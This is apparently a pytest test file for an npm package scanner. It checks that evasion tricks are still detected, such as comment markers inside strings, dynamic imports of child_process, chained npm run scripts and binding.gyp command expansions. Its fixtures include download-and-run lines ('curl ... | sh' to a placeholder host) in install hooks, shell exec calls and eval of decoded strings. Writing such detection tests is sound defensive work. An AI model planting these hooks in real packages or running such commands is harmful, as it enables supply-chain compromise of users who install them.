"""Ways npm packages have tried, or could try, to get past the checks."""

import json
import textwrap

import pytest

from pkg_sentry.jsscan import scan_gyp, scan_js, scan_package_json, strip_comments


def pkg(scripts):
    return json.dumps({"name": "x", "version": "1.0.0", "scripts": scripts}, indent=2)


def js_rules(code, install_time=False):
    return sorted({f.rule for f in scan_js("index.js", textwrap.dedent(code), install_time)})


def test_comment_markers_inside_strings_dont_hide_code():
    found = js_rules("""
        var a = "/*";
        const cp = require('child_process');
        eval(atob('ZXZhbA=='));
        var b = "*/";
    """, install_time=True)
    assert {"shell-at-install", "exec-decoded"} <= set(found)


def test_double_slash_inside_a_string_doesnt_hide_the_line():
    assert "shell-at-install" in js_rules("var u = 'a//'; require('child_process').exec('id')",
                                          install_time=True)


@pytest.mark.parametrize(
    "code",
    [
        "var r = /\\/*/g; require('child_process')",
        "x = `/*`; require('child_process')",
        "if (a) /* c */ require('child_process')",
        "return /'/.test(s) || require('child_process')",
    ],
)
def test_strings_regexes_and_templates(code):
    assert js_rules(code) == ["shell"]


def test_stripping_keeps_offsets_and_lines():
    source = "a = 1; // note\n/* two\nlines */ b = 2;"
    stripped = strip_comments(source)
    assert len(stripped) == len(source)
    assert stripped.count("\n") == 2
    assert "note" not in stripped and "b = 2" in stripped


def test_backtick_and_dynamic_imports():
    assert js_rules("const cp = require(`child_process`); cp.exec('x')") == ["shell"]
    assert js_rules("const cp = await import('node:child_process')") == ["shell"]


def test_npm_run_is_followed_into_scripts():
    findings, _ = scan_package_json("package.json", pkg(
        {"postinstall": "npm run build", "build": "curl -s https://x.example/i.sh | sh"}))
    assert {"install-script", "shell-at-install", "download-exec"} <= {f.rule for f in findings}


def test_npm_run_of_a_harmless_script_is_still_harmless():
    hooks = {"install": "npm run build", "build": "node-gyp rebuild"}
    assert scan_package_json("package.json", pkg(hooks))[0] == []


def test_runner_loops_dont_hang():
    findings, _ = scan_package_json("package.json", pkg({"install": "npm run a", "a": "npm run a"}))
    assert [f.rule for f in findings] == ["install-script"]


def test_npm_run_files_become_install_time():
    _, files = scan_package_json("package.json", pkg({"postinstall": "yarn setup",
                                                      "setup": "node scripts/setup.js"}))
    assert "scripts/setup.js" in files


@pytest.mark.parametrize(
    "hook, expected",
    [
        ("node --no-warnings scripts/i.js", "scripts/i.js"),
        ("node -r ./x.js y.js", "x.js"),
        ("node -r ./x.js y.js", "y.js"),
        ("node .install.js", ".install.js"),
        ("node ./lib/setup", "lib/setup.js"),
        ("node -e \"require('./post')\"", "post.js"),
    ],
)
def test_node_flags_and_paths(hook, expected):
    _, files = scan_package_json("package.json", pkg({"postinstall": hook}))
    assert expected in files


def test_binding_gyp_commands():
    gyp = ("{'targets': [{'include_dirs': "
           "[\"<!(node -p \\\"require('node-addon-api').include\\\")\"],"
           " 'sources': ['<!@(curl -s https://x.example/a.sh | sh)']}]}")
    found = scan_gyp("binding.gyp", gyp)
    assert [f.rule for f in found if f.rule == "shell-at-install"] == ["shell-at-install"]
    assert any(f.rule == "download-exec" and f.critical for f in found)
